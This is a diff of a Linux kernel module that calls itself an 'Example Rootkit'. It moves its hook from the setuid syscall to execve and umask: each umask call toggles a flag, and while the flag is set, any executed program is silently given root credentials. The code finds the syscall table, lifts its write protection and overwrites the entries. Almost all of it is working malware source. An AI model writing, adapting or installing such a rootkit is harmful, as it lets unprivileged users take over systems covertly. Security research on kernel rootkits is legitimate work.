@@ -9,14 +9,16 @@
 #include <linux/syscalls.h>
 #include <linux/fs.h>
 #include <linux/sched.h>
-#include <linux/moduleparam.h>
 #include <linux/kallsyms.h>
 #include <linux/cred.h>
 
 #define MA "@Pink_P4nther"
 #define MD "Example Rootkit"
 #define ML "GPL"
-#define MV "1.0"
+#define MV "1.1"
+
+/* Enable root escalation flag */
+int ref = 0;
 
 /* Syscall table address */
 void **sct_address;
@@ -24,23 +26,22 @@ void **sct_address;
 /* Set sys_call_table address to sct_address */
 void set_sct_addr(void);
 
-/* Setuid syscall hook */
-asmlinkage int (*origin_suidcall) (uid_t uid);
+/* Execve syscall hook */
+asmlinkage int (*origin_execvecall) (const char *filename, const char *const argv[], const char *const envp[]);
 
-/* Malicious setuid hook syscall */
-asmlinkage int mal_suidcall(uid_t uid)
+/* Mal execve hook syscall */
+asmlinkage int mal_execve(const char *filename, const char *const argv[], const char *const envp[])
 {
-	if (uid == 1337)
-	{
-		/* Create new cred struct */
+	if (ref == 1){
+		printk(KERN_INFO "[+] Giving r00t!");
+		
+		/* Create process cred struct */
 		struct cred *np;
 		/* Create uid struct */
 		kuid_t nuid;
 		/* Set uid struct value to 0 */
 		nuid.val = 0;
-		/* Print UID and EUID of current process to dmesg */
-		printk(KERN_INFO "[+] UID = %hu\n[+] EUID = %hu",current->cred->uid,current->cred->euid);
-		printk(KERN_WARNING "[!] Attempting UID change!");
+		
 		/* Prepares new set of credentials for task_struct of current process */
 		np = prepare_creds();
 		/* Set uid of new cred struct to 0 */
@@ -49,10 +50,25 @@ asmlinkage int mal_suidcall(uid_t uid)
 		np->euid = nuid;
 		/* Commit cred to task_struct of process */
 		commit_creds(np);
-		printk(KERN_WARNING "[!] Changes Complete!");
 	}
-	/* Call original setuid syscall */
-	return origin_suidcall(uid);
+	/* Call original execve syscall */
+	return origin_execvecall(filename,argv,envp);
+}
+
+/* Umask syscall hook */
+asmlinkage int (*origin_umaskcall) (mode_t mask);
+
+/* Mal umask hook syscall */
+asmlinkage int mal_umask(mode_t mask){
+	if (ref == 0){
+		/* Set enable root escalation flag */
+		ref = 1;
+	} else{
+		/* Unset enable root escalation flag */
+		ref = 0;
+	}
+	/* Call original umask syscall */
+	return origin_umaskcall(mask);
 }
 
 /* Set SCT Address */
@@ -88,17 +104,19 @@ static int __init hload(void)
 {
 	/* Set syscall table address */
 	set_sct_addr();
-	printk(KERN_INFO "[+] Got sys call table address: 0x%x",sct_address);
-	/* Set the address to the setuid call to our origin setuid call */
-	origin_suidcall = sct_address[__NR_setuid];
-
+	/* Set pointer to original syscalls */
+	origin_execvecall = sct_address[__NR_execve];
+	origin_umaskcall = sct_address[__NR_umask];
 	/* Make SCT writeable */
 	sct_w((unsigned long)sct_address);
-	
-	/* Hook the setuid call (Write our malicious syscall's address in place of
-	 * the original setuid syscall's address)
-	 */
-	sct_address[__NR_setuid] = mal_suidcall;
+
+	/* Hook execve and umask syscalls */
+	sct_address[__NR_execve] = mal_execve;
+	sct_address[__NR_umask] = mal_umask;
+	/* Set SCT write protected */
+	sct_xw((unsigned long)sct_address);
+
+	printk(KERN_INFO "[?] SCT: [0x%llx]\n[?] EXECVE: [0x%llx]\n[?] UMASK: [0x%llx]",sct_address,sct_address[__NR_execve],sct_address[__NR_umask]);
 
 	return 0;
 }
@@ -106,8 +124,10 @@ static int __init hload(void)
 /* Unloads LKM */
 static void __exit hunload(void)
 {
-	/* Rewrite the old setuid syscall address back into the SCT page */
-	sct_address[__NR_setuid] = origin_suidcall;
+	/* Rewrite the original syscall addresses back into the SCT page */
+	sct_w((unsigned long )sct_address);
+	sct_address[__NR_execve] = origin_execvecall;
+	sct_address[__NR_umask] = origin_umaskcall;
 
 	/* Make SCT page write protected */
 	sct_xw((unsigned long)sct_address);
